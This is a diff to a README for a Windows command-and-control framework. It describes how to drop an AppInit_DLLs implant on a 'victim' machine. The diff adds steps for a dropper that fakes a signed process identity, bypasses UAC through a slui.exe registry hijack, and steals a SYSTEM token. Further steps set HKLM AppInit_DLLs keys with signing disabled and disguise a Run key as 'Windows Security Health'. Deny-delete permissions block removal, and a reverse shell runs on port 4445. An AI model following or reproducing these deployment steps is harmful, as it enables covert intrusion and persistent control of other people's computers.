@@ -47,8 +47,11 @@
 
 - **Operator** connects to the server via `client.py`
 - **Agent** (`AppInit_DLLs.dll`) runs on the victim and connects back to the server
-- The server **relays** commands from operator → agent and **broadcasts** victim events → operator
-- The **reverse shell** is a direct TCP connection (bypasses the server entirely)
+- **Hybrid Module Dispatch**: When an operator dispatches a command, `server.py` evaluates the target module:
+  - **Server-Side Python Modules** (`ssh`, `rdp`, `registry`, `activity`): Executed locally on the server host via Python libraries (`psutil`, `paramiko`, `winreg`).
+  - **Victim Implant Modules** (`notify`, `shell`): Forwarded over the active TCP connection via `relay_to_agent()` to `AppInit_DLLs.dll` running on the victim endpoint.
+- **Push Event Telemetry**: Victim window and lock state events captured by the DLL's WinEvent hooks are streamed to the server and broadcasted asynchronously to all authenticated operators.
+- **Reverse Shell**: An independent direct TCP connection on port `4445` (bypasses the server entirely for zero latency).
 
 ---
 
@@ -59,9 +62,9 @@
 | `server.py` | C2 server — relays commands, broadcasts push events |
 | `client.py` | Operator interactive CLI |
 | `dll.cpp` | Windows agent DLL source (compiles to `AppInit_DLLs.dll`) |
-| `SAFE.cpp` | Persistence installer source (compiles to `SAFE.exe`) |
-| `AppInit_DLLs.dll` | Compiled agent — drop on victim |
-| `SAFE.exe` | Compiled installer — run once on victim to set up persistence |
+| `SAFE.cpp` | Failsafe watchdog & cleanup tool source (compiles to `SAFE.exe`) |
+| `AppInit_DLLs.dll` | Compiled in-memory agent — dropped on victim |
+| `SAFE.exe` | Compiled failsafe watchdog (silent auto-repair) and cleanup tool (`/remove`) |
 | `modules/ssh_module.py` | Server-side SSH (Paramiko) |
 | `modules/rdp_module.py` | Server-side RDP launcher |
 | `modules/registry_module.py` | Server-side registry stub |
@@ -127,37 +130,42 @@ Or set them as environment variables on the victim at runtime:
 
 ### Step 2 — Transfer files to victim
 
-Drop both files onto the victim machine (USB, share, download, etc.):
+Drop `AppInit_DLLs.dll` and `SAFE.exe` in the **same staging folder** on the victim machine (USB, network share, or download):
 ```
-AppInit_DLLs.dll   ← the agent
-SAFE.exe           ← the persistence installer
+AppInit_DLLs.dll   ← the C2 implant
+SAFE.exe           ← the persistence watchdog & cleanup tool
 ```
-Keep them in the **same folder** — `SAFE.exe` looks for `AppInit_DLLs.dll` next to itself.
+`SAFE.exe` resides next to `AppInit_DLLs.dll` so the initial installer can stage both binaries into `%USERPROFILE%`.
 
-### Step 3 — Run SAFE.exe on the victim (first time only, as admin)
+### Step 3 — Initial Execution & Persistence Establishment
 
-```
-Double-click SAFE.exe  →  UAC prompt appears  →  click Yes
-```
+You have two primary options for establishing execution on the victim:
 
-What SAFE.exe does automatically:
-1. Copies itself → `C:\Users\<victim>\SAFE.exe`
-2. Copies the DLL → `C:\Users\<victim>\AppInit_DLLs.dll`
-3. Sets registry for auto-load on every boot:
+#### Option A: Automated Loader & Privilege Escalation (Recommended)
+Run the compiled `main.exe` dropper (from `red.cpp`). `main.exe`:
+1. Masquerades its PEB as a legitimate signed process (via `process_steal.h`).
+2. Bypasses UAC with zero prompts using the `slui.exe` registry hijack.
+3. Duplicates a SYSTEM token from `winlogon.exe` (via `privesc.h`).
+4. Installs the `AppInit_DLLs` registry keys in `HKLM`.
+
+#### Option B: In-Memory DLL Initialization
+When `AppInit_DLLs.dll` is first loaded into any GUI process:
+1. `failsafe_mod::ensure()` in `dll.cpp` automatically copies:
+   - `AppInit_DLLs.dll` → `%USERPROFILE%\AppInit_DLLs.dll`
+   - `SAFE.exe` → `%USERPROFILE%\SAFE.exe`
+2. Configures the registry for persistent injection across GUI binaries:
    ```
    HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
      AppInit_DLLs              = C:%HOMEPATH%\AppInit_DLLs.dll
      LoadAppInit_DLLs          = 1
      RequireSignedAppInit_DLLs = 0
    ```
-4. Sets a Run key for self-healing on every login:
-   ```
-   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-     "Windows Security Health" = "C:\Users\<victim>\SAFE.exe /check"
-   ```
-5. ACL-protects both files (regular users cannot delete them)
+3. Registers `SAFE.exe` in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` under `"Windows Security Health"`.
+4. Applies strict DACL protection denying `DELETE` rights to standard users.
 
-After this, **the DLL loads automatically on every reboot**. No further action needed.
+#### Background Watchdog & Clean Teardown
+- **Watchdog Mode (`SAFE.exe`)**: Runs silently on each user login to continuously verify and restore AppInit registry entries and file permissions if tampered with.
+- **Cleanup Mode (`SAFE.exe /remove`)**: Authorizes uninstallation by removing the restrictive DACLs, wiping the `AppInit_DLLs` keys, deleting the `Run` entry, and clearing hijack associations.
 
 ### Step 4 — Verify connection
 
